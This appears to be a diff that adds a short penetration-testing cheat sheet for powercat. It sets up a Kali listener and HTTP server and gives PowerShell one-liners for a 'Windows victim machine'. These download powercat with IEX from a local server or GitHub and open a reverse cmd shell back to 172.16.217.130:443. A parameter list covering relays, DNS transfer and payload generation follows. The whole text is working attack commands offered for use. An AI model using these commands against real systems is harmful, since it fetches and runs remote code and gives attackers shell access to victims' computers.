@@ -1,0 +1,37 @@
+ON KALI:
+git clone https://github.com/besimorhino/powercat.git
+cd powercat/ 
+python -m SimpleHTTPServer 80
+open in another terminal a netcat listener: nc -l -p 443
+
+ON WINDOWS VICTIM MACHINE:
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.217.130/powercat.ps1');powercat -c 172.16.217.130 -p 443 -e cmd"
+
+------------------------------
+LOAD POWERCAT script from GITHUB:
+ON KALI:
+nc -l -p 443
+
+ON WINDOWS:
+powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 172.16.217.130 -p 443 -e cmd"
+
+
+Parameters:
+-l      Listen for a connection.                             [Switch]
+-c      Connect to a listener.                               [String]
+-p      The port to connect to, or listen on.                [String]
+-e      Execute. (GAPING_SECURITY_HOLE)                      [String]
+-ep     Execute Powershell.                                  [Switch]
+-r      Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
+-u      Transfer data over UDP.                              [Switch]
+-dns    Transfer data over dns (dnscat2).                    [String]
+-dnsft  DNS Failure Threshold.                               [int32]
+-t      Timeout option. Default: 60                          [int32]
+-i      Input: Filepath (string), byte array, or string.     [object]
+-o      Console Output Type: "Host", "Bytes", or "String"    [String]
+-of     Output File Path.                                    [String]
+-d      Disconnect after connecting.                         [Switch]
+-rep    Repeater. Restart after disconnecting.               [Switch]
+-g      Generate Payload.                                    [Switch]
+-ge     Generate Encoded Payload.                            [Switch]
+-h      Print the help message.                              [Switch]
